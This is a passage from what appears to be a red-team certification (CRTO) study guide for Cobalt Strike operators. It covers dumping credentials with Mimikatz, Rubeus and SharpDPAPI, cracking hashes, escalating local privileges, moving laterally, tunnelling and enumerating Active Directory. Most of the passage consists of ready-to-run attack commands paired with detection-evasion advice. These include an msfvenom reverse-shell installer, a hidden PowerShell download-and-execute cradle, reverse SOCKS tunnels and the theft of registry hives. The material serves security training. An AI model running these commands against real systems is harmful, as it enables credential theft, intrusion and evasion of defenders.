   └─ Need domain-wide material (krbtgt, DCSync)?
      └─ Section 12 (requires domain privileges first)
```

### 7.2 Mimikatz via Beacon

Cobalt Strike runs Mimikatz in a sacrificial process (fork-and-run). The `!` prefix elevates the command to SYSTEM; `@` impersonates the beacon thread token.

```text
# Check you can reach LSASS
mimikatz !privilege::debug
mimikatz !sekurlsa::logonpasswords

# Kerberos material (more useful than plaintext for lateral movement)
mimikatz !sekurlsa::ekeys
mimikatz !sekurlsa::tickets

# Local SAM / LSA secrets / cached domain creds
mimikatz !lsadump::sam
mimikatz !lsadump::secrets
mimikatz !lsadump::cache

# Certificates (for ADCS / DPERSIST-1)
mimikatz !crypto::certificates /export
mimikatz !crypto::certificates /systemstore:local_machine /export

# DCSync (only after you have the rights — Section 12)
mimikatz !lsadump::dcsync /domain:<domain> /user:krbtgt
mimikatz !lsadump::dcsync /domain:<domain> /all
```

**What each gives you**

| Command | Output | Use |
|---|---|---|
| `sekurlsa::logonpasswords` | Plaintext (if reversible), NTLM, SHA1 | PTH, cracking |
| `sekurlsa::ekeys` | AES128/256 + RC4 Kerberos keys | Overpass-the-hash, golden/silver tickets |
| `sekurlsa::tickets` | Kerberos tickets in memory | Pass-the-ticket |
| `lsadump::sam` | Local SAM NTLM hashes | Local admin reuse |
| `lsadump::secrets` | LSA secrets (service accounts, machine account) | Pivoting, trust abuse |
| `lsadump::cache` | Cached domain credentials (DCC2) | Offline cracking |
| `crypto::certificates` | Certificates + private keys | ADCS abuse, persistence |

**OPSEC:**
- LSASS access is visible as **Sysmon 10** (`ProcessAccess` with `GrantedAccess 0x1010`/`0x1410`) and is a Defender ASR target ("Block credential stealing from lsass.exe").
- `mimikatz` in CS forks a process; the **parent** is your beacon's `spawnto` process. A `rundll32.exe` parent opening `lsass.exe` is a textbook detection.
- Do it **once**. Do not run `logonpasswords`, then `ekeys`, then `tickets` on the same host in a loop.
- Prefer `sekurlsa::ekeys` over `logonpasswords` when you need material for Kerberos: less plaintext, and AES keys are more OPSEC-friendly than RC4.
- Never do this on a DC, a CA, or the objective host unless there is no alternative.

### 7.3 SAM, LSA secrets, and offline extraction

When you have local admin/SYSTEM and want to avoid Mimikatz's LSASS signature:

```text
# Save hives, then exfiltrate and parse offline
reg save HKLM\SAM       C:\Windows\Temp\sam.hiv
reg save HKLM\SYSTEM    C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY  C:\Windows\Temp\security.hiv
download C:\Windows\Temp\sam.hiv
download C:\Windows\Temp\system.hiv
download C:\Windows\Temp\security.hiv
del C:\Windows\Temp\sam.hiv C:\Windows\Temp\system.hiv C:\Windows\Temp\security.hiv
```

```bash
# Operator side
secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

`secretsdump.py -ntds` against a DC copy is DCSync-equivalent and very loud; use only with rights and intent.

**OPSEC:** `reg save` writes files (Sysmon 11) and touches the registry. Delete the hives. Do not leave them in `C:\Temp` on a Tier-0 host.

### 7.4 Kerberos tickets (Rubeus)

```text
# See what is available
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist

# Dump tickets for a logon session
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x<id> /nowrap

# Pass a ticket into the current session
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x<id> /ticket:<base64>

# Import a .kirbi file
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>

# Clear tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge

# Monitor for new tickets (e.g., after coercion)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
```

**OPSEC:** `dump`/`triage` read LSASS (same detection surface as Mimikatz, though lighter). `ptt` creates a logon session; `createnetonly` is often cleaner for using a ticket without a full interactive logon.

### 7.5 DPAPI

DPAPI protects credentials, browser secrets, scheduled-task passwords, and RDP saved credentials. Decryption usually needs the user's masterkey (from LSASS or the user's profile) or the machine key.

```text
# User masterkeys / credentials / vaults
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe masterkeys
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe vaults
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe rdg

# Machine context
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe machinemasterkeys
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe machinecredentials
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

# Mimikatz equivalents
mimikatz dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<blob>
mimikatz dpapi::masterkey /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<guid> /rpc
mimikatz !sekurlsa::dpapi
```

**OPSEC:** DPAPI decryption via `dpapi::masterkey ... /rpc` asks a DC for the backup key — a directory interaction. Prefer local user masterkeys when you already have them. Reading the user's profile is quieter than reading LSASS.

### 7.6 Credential Manager and browsers

```text
# Saved Windows credentials
cmdkey /list
mimikatz !vault::list
mimikatz !vault::cred /patch

# Chrome / Edge login data (DPAPI-protected)
mimikatz dpapi::chrome /in:"C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

```text
# SharpChromium / SharpDPAPI browser modules if available
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /target:chrome
```

**OPSEC:** reading a user's browser database touches a file (Sysmon 11) and may lock it. Copy the file first if needed, then delete the copy.

### 7.7 Where credentials hide

| Source | Tool | Requires | Noise |
|---|---|---|---|
| LSASS memory | Mimikatz / Rubeus dump | Admin/SYSTEM (or debug) | 🔊🔊 |
| SAM | `reg save` + secretsdump, `lsadump::sam` | Admin/SYSTEM | 🔊 |
| LSA secrets | `lsadump::secrets` | SYSTEM | 🔊 |
| Cached domain creds | `lsadump::cache` | SYSTEM | 🔊 |
| Kerberos tickets | Rubeus `triage`/`dump` | Admin (often) | 🔊 |
| DPAPI (user) | SharpDPAPI / Mimikatz | User context | 🟢 |
| Credential Manager | `vault::*`, `cmdkey` | User context | 🟢 |
| Browsers | `dpapi::chrome` | User context | 🟢 |
| GPO `cpassword` in SYSVOL | `findstr` + `Get-DecryptedCpassword` | Domain user | 🟢 |
| Unattended install files | `dir /s unattend.xml` | Local access | 🟢 |
| Files on shares | `Find-InterestingFile` | Share access | 🟢 |
| ADCS / certificates | Certify / SharpDPAPI | Varies | Depends |

### 7.8 Cracking quick reference

| Hash type | Hashcat mode | Source |
|---|---|---|
| NTLM | `-m 1000` | SAM, LSASS |
| NetNTLMv2 | `-m 5600` | Responder/relay capture |
| Kerberoast TGS (RC4) | `-m 13100` | `Rubeus kerberoast` |
| AS-REP | `-m 18200` | `Rubeus asreproast` |
| DCC2 (mscache2) | `-m 2100` | `lsadump::cache` |
| MSCache | `-m 2000` | Older cached creds |
| AES Kerberoast | `-m 19700` | Rare; slower |

```bash
hashcat -m 13100 -a 0 hashes.txt rockyou.txt -r rules/best64.rule
hashcat -m 18200 -a 0 asrep.txt rockyou.txt
hashcat -m 1000  -a 0 ntlm.txt rockyou.txt
```

**OPSEC:** cracking is offline and invisible. Do it on the operator side, not on the target host.

### 7.9 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `ERROR kuhl_m_sekurlsa_acquireLSA` | Not admin/SYSTEM, or LSASS protected | Elevate (`getsystem`), or use another source |
| `mimikatz` returns nothing | AV/EDR stripped it, or wrong arch | Try `execute-assembly`-based tool; match arch |
| `0x80070005` on DPAPI | Wrong user context / no masterkey | Get the masterkey first; try `/rpc` |
| `hashdump` empty | Token not SYSTEM | `getsystem`, then retry |
| Beacon dies during Mimikatz | AV kills the sacrificial process | Change `spawnto`; use `blockdlls`; try `nanodump` |
| Ticket `ptt` works but access denied | Ticket for wrong SPN/service | Request the right service (`cifs/<host>`), or use S4U |

## 8. Local privilege escalation

You usually land as a normal user or a service account. Local admin on a workstation is often enough to move laterally; SYSTEM is needed for SAM/LSA on the host and for some service abuse.

### 8.1 Enumerate before you exploit

```text
whoami /all
whoami /priv
whoami /groups
systeminfo
wmic qfe get HotFixID,InstalledOn
wmic service get name,displayname,pathname,startmode
sc query state= all
schtasks /query /fo LIST /v
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=all -full
```

**Priority order for the exam:**
1. Token privileges (`SeImpersonate`, `SeAssignPrimaryToken`, `SeDebug`, `SeBackup`, `SeRestore`, `SeTakeOwnership`, `SeLoadDriver`).
2. Service misconfigurations (weak permissions, unquoted paths, DLL hijack).
3. UAC bypass (if already local admin but medium integrity).
4. AlwaysInstallElevated.
5. Credentials in files / registry.
6. Kernel exploits — last resort; they crash hosts and are rarely needed.

### 8.2 Token privileges

| Privilege | What it enables | Quiet approach |
|---|---|---|
| `SeImpersonatePrivilege` | Impersonate a client → Potato family → SYSTEM | Potato matching the OS build |
| `SeAssignPrimaryTokenPrivilege` | Assign a token to a process | Potato family |
| `SeDebugPrivilege` | Open any process → LSASS | Loud; avoid unless necessary |
| `SeBackupPrivilege` | Read files bypassing ACLs → SAM/SYSTEM | `robocopy /b` or `reg save` |
| `SeRestorePrivilege` | Write files bypassing ACLs | Overwrite a service binary |
| `SeTakeOwnershipPrivilege` | Take ownership of objects | `takeown` + `icacls` |
| `SeLoadDriverPrivilege` | Load a driver | Driver abuse; high risk |

```text
# Cobalt Strike built-in (named-pipe impersonation)
getsystem

# Or elevate a listener
elevate svc-exe <listener>
```

**OPSEC:** `getsystem` creates a named pipe and impersonates; it is a known pattern but far quieter than a Kernel exploit. It still produces process/token telemetry.

### 8.3 Potato family (SeImpersonate → SYSTEM)

Choose by OS/build:

| Tool | Target | Example |
|---|---|---|
| `GodPotato` | Modern Windows (2012–2022+) | `GodPotato.exe -cmd "cmd /c whoami"` |
| `SweetPotato` | Mixed | `SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-nop -w hidden -enc <b64>"` |
| `PrintSpoofer` | Print Spooler present | `PrintSpoofer.exe -i -c cmd` |
| `RoguePotato` | Modern, needs redirect | `RoguePotato.exe -r <ip> -l 9999 -e "cmd /c whoami"` |
| `JuicyPotato` | Older (<2019) | `JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *` |

```text
# Typical: run from a writable path, capture output or spawn a beacon
upload C:\Tools\GodPotato.exe C:\Windows\Temp\gp.exe
run C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"
del C:\Windows\Temp\gp.exe
```

**OPSEC:** the exploit creates a process and often a COM/RPC listener; some variants bind a port. Delete the binary. Do not run multiple variants on the same host.

### 8.4 Service misconfigurations

```text
# Enumerate
sc qc <service>
sc query <service>
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Users" *
icacls "C:\Path\To\Service"
icacls "C:\Path\To\Service.exe"
```

**Unquoted service path** — a path like `C:\Program Files\Vendor\Service\svc.exe` without quotes lets you plant `C:\Program Files\Vendor\Service.exe`.

```text
sc qc <service>
# If path is unquoted and a writable directory exists earlier in the path:
upload C:\Tools\payload.exe "C:\Program Files\Vendor\Service.exe"
sc stop <service>
sc start <service>
```

**Weak service permissions** — if your user can change the binary path:

```text
sc config <service> binPath= "C:\Windows\Temp\evil.exe"
sc stop <service>
sc start <service>
```

**Weak binary permissions** — if you can overwrite the service binary:

```text
copy /y C:\Windows\Temp\evil.exe "C:\Program Files\Vendor\service.exe"
sc stop <service>
sc start <service>
```

**DLL hijacking** — if the service loads a DLL from a writable directory, place a proxy DLL there. Use a signed proxy or a known DLL-search-order path.

**OPSEC:** service changes produce **7045/4697**, `sc` command lines (4688), and often a new process. Restore the original `binPath` and delete the payload when done. Never do this on a Tier-0 server unless the objective requires it.

### 8.5 UAC bypass (local admin, medium integrity)

If you are in the local `Administrators` group but running at medium integrity, you need an elevated token.

```text
# Cobalt Strike
elevate uac-schtasks <listener>       # scheduled-task UAC bypass
elevate uac-token-duplication <listener>

# Check integrity
whoami /groups | findstr /i "Mandatory"
```

**OPSEC:** UAC bypasses leave registry/COM/task artifacts and often spawn `fodhelper.exe`, `computerdefaults.exe`, or `sdclt.exe`. These are well-signatured. Prefer a legitimate elevated path (a service you already control, a scheduled task, or a token you stole).

### 8.6 AlwaysInstallElevated

If both HKLM and HKCU policies are set to `1`, any user can install an MSI as SYSTEM.

```text
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate an MSI that runs a command
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

```bash
# Operator side: build the MSI with msfvenom or wixtoolset
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi
```

**OPSEC:** `msiexec` execution and an installer log; usually obvious. Use only if it is the clean path.

### 8.7 Scheduled tasks, autoruns, and startup

```text
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "TaskName Run As Mode"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp"
```

**OPSEC:** creating a task is 4698; modifying one is 4702. For persistence discussion, see Section 14.

### 8.8 Credentials in files and registry

```text
# Unattended installs
dir /s /b C:\unattend.xml C:\sysprep.inf C:\sysprep\sysprep.xml
findstr /si "password" C:\*.xml C:\*.ini C:\*.config 2>nul

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Common config locations
dir /s /b C:\inetpub\wwwroot\web.config
type C:\inetpub\wwwroot\web.config | findstr /i "connectionString password"
```

**OPSEC:** read-only and quiet. This is often the best first move.

### 8.9 Kernel exploits (last resort)

Kernel exploits (e.g., older `MS16-032`, `CVE-2021-1732`, `CVE-2022-21882`) are rarely necessary on CRTO and are high-risk: a failed exploit bluescreens the host and ends that path. Only use one if:
- The host is disposable (a Tier-2 workstation), and
- You have verified the build is vulnerable, and
- You have a fallback path.

### 8.10 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `getsystem` fails | SeImpersonate missing, or no suitable service | Check `whoami /priv`; try a Potato |
| Potato fails with `RPC` error | OS build mismatch | Try GodPotato/SweetPotato; specify a different COM port |
| `sc start` access denied | Service ACL, not binary ACL | `sc sdshow <service>`; try a different service |
| Service starts then stops | Payload crashes / wrong arch | Match x86/x64; test the payload standalone |
| UAC bypass does nothing | UAC disabled already, or path blocked | Check integrity; try another method |
| `msiexec` blocked | AppLocker/WDAC/policy | Use a service or task path instead |

## 9. Lateral movement

Lateral movement is where most candidates lose time and OPSEC points. The goal is not "use every technique" — it is "reach the next host with the least noise that works."

### 9.1 Preconditions

Before moving, confirm:

| Requirement | Check |
|---|---|
| Credential or token valid on the target | `make_token`, `pth`, `ptt`, or a stolen token |
| Administrative access on the target | Local admin, or a service account with rights |
| Network path to the target | `portscan <host> 445,5985,3389`, `Test-NetConnection` |
| Name resolution | Kerberos needs the **FQDN**, not an IP; check DNS |
| Target OS/architecture | `Get-DomainComputer`, `nslookup`, `systeminfo` via a session |

**Rule:** a credential that works on one host does not automatically work on another. Local admin reuse is common but not universal. Verify before you spray a technique across a subnet.

### 9.2 Credential use: PTH, PTT, overpass-the-hash

```text
# Pass-the-hash (NTLM)
pth <DOMAIN>\<user> <ntlm-hash>
pth <DOMAIN>\<user> <ntlm-hash> <listener>     # spawn a session in the new context
rev2self

# Make a netonly token from a password
make_token <DOMAIN>\<user> <password>
rev2self

# Steal an existing token
steal_token <pid>
token-store steal <pid>
token-store show
token-store use <id>
rev2self

# Pass-the-ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>

# Overpass-the-hash → TGT → use it
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<user> /rc4:<hash> /domain:<domain> /dc:<dc> /opsec /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<user> /aes256:<key> /domain:<domain> /dc:<dc> /opsec /nowrap
```

**Which to use**

| Situation | Use | Why |
|---|---|---|
| Have NTLM hash, target accepts NTLM | `pth` | Simple, but 4624 type 3 + 4776 |
| Have AES key / password, Kerberos possible | `asktgt` → `ptt` | AES is less anomalous than RC4 |
| Have a ticket already | `ptt` | No new credential validation |
| Have a process token | `steal_token` | No credential material needed |

**OPSEC:** pass-the-hash is detectable as NTLM network logons from a user who should use Kerberos. Prefer Kerberos (AES) where the environment allows it.

### 9.3 Cobalt Strike: `jump` and `remote-exec`

`jump` starts a **new session** on the target. `remote-exec` runs a **command** on the target using an existing session's context.

```text
# New session via PsExec (service-based)
jump psexec64 <target-fqdn> <listener>
jump psexec_psh <target-fqdn> <listener>

# New session via WinRM
jump winrm64 <target-fqdn> <listener>

# New session via SSH (if configured)
jump ssh <target> <listener>

# Run a command remotely (no new session)
remote-exec psexec <target> C:\Windows\Temp\payload.exe
remote-exec winrm  <target> powershell.exe -nop -w hidden -c "C:\Windows\Temp\payload.exe"

# Connect to an existing SMB/TCP beacon
link <target-fqdn> <pipe-name>
connect <target> <port>
unlink
```

**Choose the jump method by target tier:**

| Method | Creates service | Writes binary | Logon type | Best for |
|---|---|---|---|---|
| `psexec64` | ✅ | ✅ | 3 | Quick, Tier-2 hosts |
| `psexec_psh` | ✅ | PowerShell | 3 | When exe is blocked |
| `winrm64` | ❌ | ❌ (in-memory-ish) | 3 + WSMan | Servers with WinRM; quieter than PsExec |
| WMI (`remote-exec wmi`) | ❌ | ❌ | 3 | When WinRM is blocked; WMI logs |
| SMB `link` | ❌ | ❌ | — | Peer-to-peer pivoting from an existing host |
| DCOM | ❌ | varies | 3 | Fallback when others fail |

> **OPSEC detail from the official docs:** `jump psexec`, `jump psexec64`, `elevate svc-exe`, and `remote-exec psexec` create/configure a service through Win32 APIs and drop a Service EXE that spawns `rundll32.exe` with **no arguments**, injects, and exits. A `rundll32.exe` with an empty command line is a strong detection signature. Use `ak-settings` (Artifact Kit) to set an explicit spawn-to path — the profile's `post-ex.spawnto` cannot use environment variables like `%windir%` in SYSTEM context. `jump psexec_psh` and `remote-exec psexec` are BOF-based and do not drop that service EXE.
>
> `remote-exec` returns **no output**; upload a payload, redirect output to a file, or use a session (`jump`) when you need to see results. `wmi` is a `remote-exec` module, not a `jump` module.

### 9.4 Native lateral movement

```text
# PsExec (Sysinternals)
PsExec.exe \\<target> -u <DOMAIN>\<user> -p <password> cmd.exe
PsExec.exe \\<target> -s cmd.exe

# WMI
wmic /node:<target> /user:<DOMAIN>\<user> /password:<password> process call create "cmd.exe /c whoami"
Invoke-WmiMethod -ComputerName <target> -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"

# WinRM / PowerShell Remoting
winrs -r:<target> cmd.exe
Enter-PSSession -ComputerName <target> -Credential <cred>
Invoke-Command -ComputerName <target> -ScriptBlock { whoami }

# Scheduled task
schtasks /s <target> /create /tn "Updater" /tr "C:\Windows\Temp\payload.exe" /sc once /st 00:00 /ru SYSTEM
schtasks /s <target> /run /tn "Updater"

# Service
sc \\<target> create Updater binPath= "C:\Windows\Temp\payload.exe" start= auto
sc \\<target> start Updater
```

**OPSEC:** every one of these is visible. PsExec is the loudest (service + binary + 7045). WinRM is usually quieter but requires the service and generates WSMan logs. WMI creates a process under `WmiPrvSE.exe` and is logged.

### 9.5 Admin shares and file access

```text
ls \\<target>\c$
ls \\<target>\admin$
download \\<target>\c$\Users\<user>\Desktop\file.txt
upload C:\Tools\payload.exe \\<target>\c$\Windows\Temp\payload.exe
```

**OPSEC:** SMB access is logged (5140/5145 if enabled) and file creation on the target is visible. Delete copied files.

### 9.6 Method selection cheat sheet

| Constraint | First choice | Fallback |
|---|---|---|
| WinRM enabled and you are admin | `jump winrm64` | WMI |
| Only SMB reachable | `jump psexec64` (accept noise) | `link` to an SMB beacon |
| AV blocks exe on disk | `jump psexec_psh` / `jump winrm64` | WMI with an in-memory payload |
| Target is Tier 0 / restricted | `link` to an existing session, or a very quiet WinRM beacon | Do not use PsExec |
| No admin, but local admin reuse | PTH + `jump` | Token theft |
| Kerberos-only environment | `asktgt` / `ptt` + WinRM/SMB | Do not rely on NTLM |

### 9.7 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `jump` fails "could not connect" | SMB/WinRM blocked or wrong FQDN | `portscan`; use FQDN; check firewall |
| Session dies immediately | Payload blocked/quarantined | Try a different listener or `psexec_psh` |
| `STATUS_LOGON_FAILURE` | Bad hash/ticket, or NTLM disabled | Try AES/`asktgt`; verify domain |
| Access denied on `c$` | Not local admin | `Find-LocalAdminAccess`; token theft |
| WinRM 5985 open but auth fails | Not in Remote Management Users | Use WMI or PsExec |
| Kerberos errors with IP | SPN mismatch | Use the FQDN, not the IP |

## 10. Pivoting and tunnelling

Pivoting lets you reach hosts that your attack box cannot. The quietest pivot is one that uses an existing beacon's network position and does not open a new listening port.

### 10.1 Concepts

| Term | Meaning | Exam use |
|---|---|---|
| **Egress beacon** | The only beacon that talks to the internet | One per network; keep it quiet |
| **Peer-to-peer beacon** | SMB/TCP beacon connected through another beacon | Internal movement without new egress |
| **SOCKS proxy** | Routes arbitrary TCP through a beacon | Operator tools (proxychains, browser, Impacket) |
| **Reverse port forward** | Listens on the target network and forwards to your box | Bring a tool or listener into the target network |
| **Bind session** | The target listens; you connect | Through a SOCKS proxy |

**Design rule:** put the loudest traffic through the quietest channel. A SOCKS proxy over an SMB beacon that hangs off a slow egress beacon is far safer than every host calling home.

### 10.2 SOCKS proxy

```text
# Start a SOCKS proxy on the beacon (operator side listens locally)
socks 1080 socks5
socks 1080 socks5 disableNoAuth <user> <pass> enableLogging

# SOCKS4 (avoid — no auth, no UDP, weaker OPSEC)
socks 1080 socks4

# Stop
socks stop
```

**OPSEC:** prefer **SOCKS5** (public CRTO guidance explicitly recommends it). `enableLogging` helps you debug but generates local logs; decide whether you want them. The proxy itself does not generate target-side traffic beyond the beacon's normal check-ins.

### 10.3 Reverse port forward

Use when you need a target-network host to reach a service on your attack box or on the beacon host.

```text
# Forward target-network port 8080 → 127.0.0.1:80 (relative to the beacon host)
rportfwd 8080 127.0.0.1 80

# Local variant (⚠ version dependent)
rportfwd_local 8080 127.0.0.1 80

# List / stop
job
rportfwd stop 8080
```

**Typical use:** host a payload on your attack box, then have the target download it through the beacon host:

```text
# On the beacon host, allow the inbound port if the firewall blocks it
powerpick New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# On the target
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://<beacon-host>:8080/payload'))"
```

**OPSEC:** `rportfwd` opens a **listener** on the beacon host (WFP 5156/5157). Adding a firewall rule is itself an artifact (and may be scored). Prefer a port the host already allows, or use an existing service.

### 10.4 SMB and TCP beacons (peer-to-peer)

```text
# On the parent beacon, create an SMB listener with a non-default pipe name first (in the GUI)
link <target-fqdn> <pipe-name>
connect <target> <port>          # TCP bind beacon
unlink                           # disconnect a child

# Verify the child
beacon> getuid
```

**OPSEC:**
- Change the **pipe name** from the default; default pipe names are heavily signatured.
- SMB beacon traffic is internal; it does not create internet egress, which is a big OPSEC win.
- Named-pipe creation/connection is Sysmon 17/18. A non-default pipe is less obvious but still visible.
- Do not link dozens of hosts to one parent; blast radius and lineage matter.

### 10.5 Other tunnels

```text
# Chisel (if available) — reverse SOCKS through an HTTP tunnel
# Operator:
chisel.exe server --reverse --port 8080
# Target:
chisel.exe client <operator-ip>:8080 R:socks

# SSH local/remote/dynamic forwarding
ssh -D 1080 <user>@<host>
ssh -L 8080:<target>:80 <user>@<host>
ssh -R 8080:localhost:80 <user>@<host>
```

**OPSEC:** every tunnel is a listening port or a long-lived connection. Prefer tunnels that reuse allowed ports (443) and remove them when done.

### 10.6 Using the proxy

```bash
# proxychains
cat /etc/proxychains4.conf
# [ProxyList]
# socks5 127.0.0.1 1080
proxychains4 nxc smb <target> -u <user> -p <pass>
proxychains4 impacket-psexec <domain>/<user>:<pass>@<target>
```

```text
# Windows: Proxifier profile pointing at 127.0.0.1:1080 (SOCKS5)
```

**Kerberos through a proxy:** tools that use Kerberos need the **FQDN** and correct DNS resolution. Point DNS at the DC or use the target's hostname in the tool. IP-based Kerberos requests fail with SPN errors.

### 10.7 Pivoting checklist

- [ ] One quiet egress beacon, long sleep/jitter
- [ ] Internal sessions are SMB/TCP peer-to-peer where possible
- [ ] SOCKS5, not SOCKS4
- [ ] Non-default SMB pipe names
- [ ] No unnecessary firewall rules; remove any you add
- [ ] `jobkill` proxies/scans when done
- [ ] `rportfwd stop`, `unlink`, and close tunnels
- [ ] Verify FQDN/DNS for Kerberos

### 10.8 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `link` fails | Wrong pipe, SMB blocked, target not admin | Check pipe name; `net view`; admin rights |
| SOCKS works but tools fail | Tool ignores proxy / DNS | Use proxychains correctly; resolve FQDN |
| `rportfwd` unreachable | Firewall on beacon host | Check `netstat`; add a rule only if necessary |
| `connect` fails | Bind beacon not listening / port blocked | Verify listener and port |
| Kerberos fails through SOCKS | IP instead of FQDN, or DNS | Use FQDN; set DNS to the DC |
| Tunnel drops | Beacon sleep too long / host rebooted | Shorten sleep for active work; re-establish |

## 11. Active Directory reconnaissance

Domain reconnaissance is mostly LDAP and SMB. LDAP queries are low-noise individually; **volume and session enumeration** are what get noticed. BloodHound is the fastest way to see the path; PowerView is the fastest way to confirm and act on it.

### 11.1 PowerView command map

```text
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```

**Domain and forest**

| Command | Returns |
|---|---|
| `Get-Domain` | Current domain object |
| `Get-DomainSID` | Domain SID (needed for tickets) |
| `Get-DomainController` | DCs: forest, name, OS version |
| `Get-DomainPolicy` | Password/lockout policy — **check before spraying** |
| `Get-DomainTrust` / `Get-ForestTrust` | Trust relationships |
| `Get-Forest` | Forest object |
| `Get-DomainSite` / `Get-DomainSubnet` | AD sites and subnets |

**Users, groups, computers**

| Command | Returns |
|---|---|
| `Get-DomainUser` | All users (filter with `-SPN`, `-PreauthNotRequired`, `-TrustedToAuth`, `-AdminCount`) |
| `Get-DomainGroup` | Groups |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse` | Nested members |
| `Get-DomainComputer` | Computers (filter `-Unconstrained`, `-TrustedToAuth`, `-Properties DnsHostName`) |
| `Get-DomainOU` | OUs (for GPO targeting) |
| `Get-DomainObject -Identity <DN>` | Any object's properties |
| `ConvertFrom-SID <sid>` / `ConvertTo-SID <name>` | SID ↔ name |

**ACLs and attack paths**

| Command | Returns |
|---|---|
| `Get-ObjectAcl -ResolveGUIDs` | ACLs on an object |
| `Find-InterestingDomainAcl -ResolveGUIDs` | ACEs granting dangerous rights |
| `Invoke-ACLScanner -ResolveGUIDs` | ACL anomalies |
| `Get-DomainObjectAcl -Identity <object> -ResolveGUIDs` | ACL for one object |

**Access and location**

| Command | Returns | Noise |
|---|---|---|
| `Find-LocalAdminAccess -Verbose` | Hosts where you are local admin | 🔊 covers many hosts |
| `Find-DomainUserLocation` | Where privileged users are logged on | 🔊 |
| `Invoke-UserHunter -CheckAccess` | User → host sessions | 🔊 |
| `Invoke-ShareFinder -Verbose` | Open shares | 🔊 |
| `Invoke-FileFinder -Verbose` | Interesting files | 🔊 |
| `Get-NetFileServer` / `Get-DomainFileServer` | File servers | 🟢 |
| `Find-DomainShare -CheckShareAccess` | Accessible shares | Medium |

**GPO and delegation**

| Command | Returns |
|---|---|
| `Get-DomainGPO` | GPOs and `GPCFileSysPath` |
| `Get-GPO -Name "<name>"` | One GPO |
| `Get-DomainObject -Identity <user> -Properties msDS-AllowedToDelegateTo` | Constrained delegation |
| `Get-DomainComputer -Unconstrained` | Unconstrained delegation hosts |
| `Get-DomainUser -TrustedToAuth` | Constrained-delegation accounts |

### 11.2 SharpHound and BloodHound

```text
# Full collection (loud)
execute-assembly C:\Tools\SharpHound\SharpHound.exe -c All --zipfilename loot.zip

# Domain-only / quieter
execute-assembly C:\Tools\SharpHound\SharpHound.exe -c DCOnly --zipfilename dc.zip

# Targeted collection
execute-assembly C:\Tools\SharpHound\SharpHound.exe -c Group,LocalAdmin,Session,ACL --zipfilename targeted.zip

# Stealth and alternate DC
execute-assembly C:\Tools\SharpHound\SharpHound.exe -c All --stealth --domaincontroller <dc-fqdn> --zipfilename loot.zip

# Alternate credentials
